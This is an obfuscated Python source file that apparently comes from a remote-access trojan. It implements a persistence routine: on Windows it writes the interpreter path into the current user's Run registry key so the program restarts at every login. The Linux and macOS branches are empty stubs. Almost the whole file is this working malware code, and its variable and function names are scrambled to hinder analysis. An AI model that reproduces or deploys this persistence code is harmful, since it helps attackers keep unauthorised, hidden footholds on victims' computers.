# -*- coding: utf-8 -*-
import sys
def kaQxqqkYcmjNyWBvtadEeIWLiezNAhyc():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    OkdLLRXbNXHVbXvbgRPbHdsdlJCYLxbf = r'Software\Microsoft\Windows\CurrentVersion\Run'
    QNAhnhOIwvprbqUeQHSqTIyqinMZhsIN = sys.executable
    try:
        vxzBpBFBaRicKhsmMdJzuHwKnlExOezF = _winreg.OpenKey(HKCU, OkdLLRXbNXHVbXvbgRPbHdsdlJCYLxbf, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(vxzBpBFBaRicKhsmMdJzuHwKnlExOezF, 'br', 0, _winreg.REG_SZ, QNAhnhOIwvprbqUeQHSqTIyqinMZhsIN)
        _winreg.CloseKey(vxzBpBFBaRicKhsmMdJzuHwKnlExOezF)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def CGIxlVLUGSZlwOJEEDQYDpLjyofNtPOC():
    return False, 'nothing here yet'
def TdhGqlcrgxtCwXOgkGaybIxpcZUxSfnZ():
    return False, 'nothing here yet'
def ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq(plat_type):
    if plat_type.startswith('win'):
        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = kaQxqqkYcmjNyWBvtadEeIWLiezNAhyc()
    elif plat_type.startswith('linux'):
        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = CGIxlVLUGSZlwOJEEDQYDpLjyofNtPOC()
    elif plat_type.startswith('darwin'):
        cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo, DrRiiYarhdzHCfkRySlqLSUaigXJXviN = TdhGqlcrgxtCwXOgkGaybIxpcZUxSfnZ()
    else:
        return 'Error, platform unsupported.'
    if cBeqtnMiHpDQVNUiXmShdWRfRTfuUzyo:
        UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = 'Persistence successful, {}.'.format(DrRiiYarhdzHCfkRySlqLSUaigXJXviN)
    else:
        UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = 'Persistence unsuccessful, {}.'.format(DrRiiYarhdzHCfkRySlqLSUaigXJXviN)
    return UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM
